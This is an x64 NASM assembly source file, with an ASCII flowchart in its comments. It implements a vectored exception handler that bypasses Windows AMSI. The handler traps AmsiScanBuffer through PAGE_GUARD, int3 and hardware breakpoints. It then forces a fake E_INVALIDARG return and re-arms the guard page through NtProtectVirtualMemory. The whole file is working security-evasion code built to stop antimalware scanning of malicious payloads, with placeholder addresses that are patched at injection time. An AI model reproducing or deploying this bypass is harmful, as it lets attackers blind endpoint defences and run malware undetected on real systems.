[BITS 64]

; nasm -f bin veh.asm -o veh.bin ; xxd -i veh.bin

 ;                      [ EXCEPTION TRIGGERED ]
 ;                                        |
 ;                                        v
 ;                          +-----------------------------+
 ;                          |  ntdll!KiUserDispatcher     |
 ;                          +--------------+--------------+
 ;                                         |
 ;                                         v
 ;                          +-----------------------------+
 ;                          |        VehHandler           |----[ NO ]---> (Next VEH Handler)
 ;                          |    (Check ExceptionCode)    |
 ;                          +--------------+--------------+
 ;                                         |
 ;                             +-----------+-----------+----------------------+
 ;                             |                       |                      |
 ;                      [ 0x80000001 ]          [ 0x80000003 ]         [ 0x80000004 ]
 ;                       (Guard Page)            (Breakpoint)          (Single Step)
 ;                             |                       |                      |
 ;                             v                       v                      v
 ;                      +--------------+        +--------------+      +------------------+
 ;                      | RIP == Target|        | Set DR0=Target|     |  RIP == Target?  |
 ;                      +------+-------+        | Set DR7=1    |      +--------+---------+
 ;                             |                | RIP += 1     |               |
 ;                      [YES]  |  [NO]          +------+-------+        [YES]  |  [NO]
 ;                             |     \                 |                       |      \
 ;                             |      \                v                       |       \
 ;                             |    +--+----------------------------------+    |     +--+-----------+
 ;                             |    | COLLISION (Other func)              |    |     | TRAP HIT     |
 ;                             |    | 1. Set EFLAGS.TF = 1                |    |     | (Re-armement)|
 ;                             |    | 2. ret EXCEPTION_CONTINUE_EXECUTION |    |     +-------+------+
 ;                             |    +-------------------------------------+    |             |
 ;                             v                                               v             v
 ;                      +-----------------------+                    +------------------------------+
 ;                      |    APPLY BYPASS       |                    |    rearm_page (Syscall)      |
 ;                      | 1. RAX = E_INVALIDARG |                    | 1. NtProtectVirtualMemory    |
 ;                      | 2. RIP = [RSP]        |                    | 2. PAGE_EXECUTE_READ | GUARD |
 ;                      | 3. RSP += 8           |                    +--------------+---------------+
 ;                      +-----------+-----------+                                   |
 ;                                  |                                               |
 ;                                  v                                               v
 ;                          [ CONTINUE_EXECUTION ] <--------------------------------+

VehHandler:
    mov r8, [rcx + 8]          ; r8 = PCONTEXT
    mov r9, [rcx]              ; r9 = PEXCEPTION_RECORD
    mov eax, dword [r9]        ; eax = ExceptionCode

    cmp eax, 0x80000001        ; STATUS_GUARD_PAGE_VIOLATION
    je handle_guard_page

    cmp eax, 0x80000003        ; EXCEPTION_BREAKPOINT (int3)
    je handle_int3

    cmp eax, 0x80000004        ; EXCEPTION_SINGLE_STEP (HWBP or TF)
    je handle_hwbp

    xor eax, eax               ; EXCEPTION_CONTINUE_SEARCH
    ret

handle_guard_page:
    mov r11, [r8 + 0xF8]       ; r11 = ContextRecord->Rip
    lea r10, [rel AmsiTarget]
    mov r10, [r10]             ; r10 = pAmsiScanBuffer
    
    cmp r11, r10
    jne handle_collateral      ; If target != AmsiScanBuffer, handle collision

    ; Target Hit via PAGE_GUARD: Apply Spoof Return
    call apply_bypass
    ; Re-arm the page after bypass
    jmp rearm_page             

handle_collateral:
    ; Collision: Enable Trap Flag (Bit 8 of EFLAGS) to re-arm after 1 instruction (Set HWBP on next instruction)
    ; Nexte instruction will trigger EXCEPTION_SINGLE_STEP (handle_hwbp), that will re-arm PAGE_GUARD and continue execution, and so on...
    ; So that we can check every page_addr used by the process and apply the bypass if it hits the target, while ignoring collisions on other functions
    or dword [r8 + 0x44], 0x100  ; ContextRecord->EFlags |= 0x100 ; Set Trap Flag to re-arm after executing the next instruction
    mov eax, -1                  ; EXCEPTION_CONTINUE_EXECUTION
    ret

handle_int3:
    lea r10, [rel AmsiTarget]
    mov r10, [r10]
    mov [r8 + 0x48], r10       ; ContextRecord->Dr0 = pAmsiScanBuffer
    mov qword [r8 + 0x60], 1   ; ContextRecord->Dr7 = 1
    add qword [r8 + 0xF8], 1   ; ContextRecord->Rip += 1
    mov eax, -1
    ret

handle_hwbp:
    ; Check if this is a Single Step from our collateral Trap Flag
    ; If Rip is NOT AmsiScanBuffer, it's a re-arm trigger
    mov r11, [r8 + 0xF8]        ; r11 = ContextRecord->Rip
    lea r10, [rel AmsiTarget]
    mov r10, [r10]
    cmp r11, r10               ; ContextRecord->Rip == pAmsiScanBuffer
    jne rearm_page             ; Re-arm PAGE_GUARD and continue

    ; Real HWBP Hit: Apply Spoof Return
    call apply_bypass
    mov eax, -1
    ret

rearm_page:

    ; Volatile registers must be saved before syscall
    sub rsp, 40h               ; Shadow space
    mov rcx, -1                ; ProcessHandle (Current)
    lea rdx, [rel PageBase]    ; Pointer to BaseAddress
    lea r8, [rel PageSize]     ; Pointer to NumberOfBytes
    mov r9, 0x120              ; PAGE_EXECUTE_READ | PAGE_GUARD
    lea r11, [rsp + 48h]       ; Pointer to OldAccessProtection (stack)
    mov [rsp + 20h], r11       ; 5th argument on stack

    lea rax, [rel pNtProtect]
    mov rax, [rax]
    call rax                   ; NtProtectVirtualMemory
    
    add rsp, 40h
    mov eax, -1                ; EXCEPTION_CONTINUE_EXECUTION
    ret

apply_bypass:
    ; Logic: RAX = E_INVALIDARG, RIP = [RSP], RSP += 8
    mov dword [r8 + 0x78], 0x80070057
    mov r11, [r8 + 0x98]       ; ContextRecord->Rsp
    mov r10, [r11]             ; Return Address
    mov [r8 + 0xF8], r10
    add qword [r8 + 0x98], 8
    ret

align 8
AmsiTarget:
    dq 0xAAAAAAAAAAAAAAAA      ; pAmsiScanBuffer
PageBase:
    dq 0xBBBBBBBBBBBBBBBB      ; pAmsiScanBuffer & ~0xFFF
PageSize:
    dq 0x0000000000001000      ; 4KB
pNtProtect:
    dq 0xCCCCCCCCCCCCCCCC      ; pNtProtectVirtualMemory